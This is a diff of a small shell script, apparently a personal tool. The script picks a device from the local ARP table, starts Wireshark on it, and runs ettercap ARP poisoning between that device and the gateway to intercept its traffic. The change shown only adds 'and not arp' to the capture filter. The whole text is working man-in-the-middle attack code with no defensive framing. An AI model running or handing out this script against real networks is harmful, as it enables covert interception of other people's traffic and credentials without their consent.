@@ -12,7 +12,7 @@ while pidof -q ping ; do
 done
 eleccion=$(sudo arp | tail -n +2 | cut -d' ' -f1|fzf)
 [ -z "$eleccion" ] && exit
-[ ! "$(pidof wireshark)" ] && sudo wireshark -i wlan0 -k -f "host $eleccion" &
+[ ! "$(pidof wireshark)" ] && sudo wireshark -i wlan0 -k -f "host $eleccion and not arp" &
 sudo ettercap -i wlan0 -M arp -T //$(route -n | grep 'UG[ \t]' | awk '{print $2}')/ //$eleccion/
 #portaEnlace=$(route -n | grep 'UG[ \t]' | awk '{print $2}')
 #sudo ettercap -i wlan0 -M arp -T //$portaEnlace/ //$eleccion/ 
